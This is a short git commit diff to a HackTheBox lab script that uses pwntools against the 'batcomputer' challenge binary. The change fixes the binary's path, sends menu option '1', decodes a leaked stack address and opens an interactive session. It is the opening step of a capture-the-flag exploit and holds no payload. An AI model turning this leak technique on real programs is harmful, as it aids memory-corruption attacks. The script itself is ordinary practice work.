9f494bc979e0520bbcf6ab8d216cbfa12c303e4f
Michel <michel@woodenshoe.org>
2021-02-14 11:38:25 -0500

    change process path

--- labnotes/htb/scripts/ch-batcomputer.py
+++ labnotes/htb/scripts/ch-batcomputer.py
@@ -3,9 +3,11 @@ from pwn import *
 
 password = 'b4tp@$$w0rd!'
 
-io = process('~/Downloads/batcomputer')
-io.sendlineafter('> ', 1)
+io = process('/home/kali/Downloads/batcomputer')
+io.sendlineafter('> ', '1')
 stack_address = io.recvline().strip().split()[-1]
 stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
 
 print(stack_address)
+
+io.interactive()
